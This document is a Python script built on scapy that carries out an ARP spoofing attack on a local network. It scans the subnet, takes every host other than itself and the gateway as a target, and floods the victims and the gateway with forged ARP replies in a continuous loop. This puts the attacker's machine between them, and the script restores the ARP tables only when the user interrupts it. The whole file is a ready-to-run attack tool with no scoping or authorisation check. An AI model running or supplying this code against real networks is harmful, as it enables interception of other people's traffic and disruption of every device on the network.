import time
import os
import socket
from scapy.all import ARP, Ether, sendpfast, srp, getmacbyip, get_if_hwaddr, conf

if os.geteuid() != 0:
    print("Run with sudo.")
    exit(1)

attack_active = True
interface = conf.iface
mac_attacker = get_if_hwaddr(interface)
conf.verb = 0

def get_gateway():
    try:
        return os.popen("route -n get default | grep 'gateway:' | awk '{print $2}'").read().strip()
    except:
        return None

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return socket.gethostbyname_ex(socket.gethostname())[2][0]

def get_network():
    ip = get_local_ip().split('.')
    return f"{ip[0]}.{ip[1]}.{ip[2]}.0/24"

def scan_network():
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=get_network()), timeout=2, iface=interface, verbose=0)
    local_ip = get_local_ip()
    gateway = get_gateway()
    return {rcv.psrc: rcv.hwsrc for _, rcv in ans if rcv.psrc not in (local_ip, gateway)}

def generate_packets(targets, gateway_ip, gateway_mac):
    packets = []
    for target_ip, target_mac in targets.items():
        packets.append(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=mac_attacker))
        packets.append(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=mac_attacker))
    return packets * 25

def spoof_loop(packets):
    while attack_active:
        sendpfast(packets, iface=interface, mbps=10000, loop=50, parse_results=False)

def restore_targets(targets, gateway_ip, gateway_mac):
    restore_packets = []
    for target_ip, target_mac in targets.items():
        restore_packets.append(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac))
        restore_packets.append(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac))
    sendpfast(restore_packets * 10, iface=interface, mbps=1000)

def main():
    global attack_active

    gateway_ip = get_gateway()
    if not gateway_ip:
        exit("Gateway not found")

    gateway_mac = getmacbyip(gateway_ip)
    if not gateway_mac:
        exit("Gateway MAC not found")

    targets = scan_network()
    if not targets:
        exit("No targets found")

    print(f"Targeting {len(targets)} devices on {gateway_ip}")
    packets = generate_packets(targets, gateway_ip, gateway_mac)

    try:
        print("Spoofing ARP tables... (CTRL+C to stop)")
        spoof_loop(packets)
    except KeyboardInterrupt:
        attack_active = False
        print("\nRestoring network...")
        restore_targets(targets, gateway_ip, gateway_mac)

if __name__ == '__main__':
    main()
